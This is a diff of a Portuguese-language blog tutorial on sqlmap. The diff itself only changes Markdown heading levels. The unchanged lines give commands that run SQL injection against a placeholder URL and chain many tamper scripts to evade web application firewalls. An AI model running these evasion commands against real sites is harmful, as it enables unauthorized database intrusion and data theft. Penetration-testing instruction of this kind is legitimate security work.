@@ -10,13 +10,13 @@ image: /assets/img/posts/sqlmap.jpg
 
 <p align="justify">Vamos seguir alguns passos para utilizar o sqlmap de forma mais eficaz:</p>
 
-## 1. Baixando o sqlmap:
+# 1. Baixando o sqlmap:
 
 ```
 git clone https://github.com/sqlmapproject/sqlmap
 ```
 
-## 2. Execute a ferramenta para avaliar a segurança do alvo específico:
+# 2. Execute a ferramenta para avaliar a segurança do alvo específico:
 
 ```
 sqlmap.py --url="www.site.com/id.php?=1" --tamper=base64encode
@@ -24,7 +24,7 @@ sqlmap.py --url="www.site.com/id.php?=1" --tamper=base64encode
 
 <p align="justify"> Dessa forma, o script converterá a consulta em uma codificação base64, ajudando a superar alguns tipos de Firewalls.</p>
 
-## 3. Quando se deparar com um Firewall mais sofisticado, será necessário empregar uma combinação de métodos de evasão:
+# 3. Quando se deparar com um Firewall mais sofisticado, será necessário empregar uma combinação de métodos de evasão:
 
 ```
 sqlmap.py --url="www.site.com/id.php?=1" --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
